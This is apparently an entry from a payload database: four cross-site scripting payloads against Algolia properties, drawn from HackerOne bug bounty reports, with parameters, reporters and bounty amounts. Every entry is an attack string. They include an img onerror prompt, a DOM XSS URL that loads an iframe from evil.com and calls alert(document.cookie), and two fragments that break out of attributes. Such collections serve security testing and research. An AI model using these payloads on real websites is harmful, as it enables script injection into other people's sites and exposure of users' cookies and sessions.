# Algolia

4 payloads.

### `e75dabd9`

```
"><img src=x onerror=prompt('XSS');>
```

**Parameter:** `attributes`
— [Stored xss ](https://hackerone.com/reports/149154) · Algolia · [sysecure](https://hackerone.com/sysecure) · $100.0

### `8bc51e07`

```
https://target.com/xss?c=%3Cmeta%20http-equiv=%22X-UA-Compatible%22%20content=%22IE=9%22%3E%3Ciframe%20src=%27https://evil.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow%27%3E%3C/iframe%3E
```

**Parameter:** `c`
— [\[target.com\] DOM Based XSS github-btn.html](https://hackerone.com/reports/200826) · Algolia · [bobrov](https://hackerone.com/bobrov) · $100.0

### `c60df04e`

```
'"><img src=x onerror=
```

— [\[GitHub Extension\] Unsanitised HTML leading to XSS on target.com](https://hackerone.com/reports/220494) · Algolia · [ysx](https://hackerone.com/ysx)

### `5725a0f9`

```
a'"><h1
```

— [\[GitHub Extension\] Unsanitised HTML leading to XSS on target.com](https://hackerone.com/reports/220494) · Algolia · [ysx](https://hackerone.com/ysx)
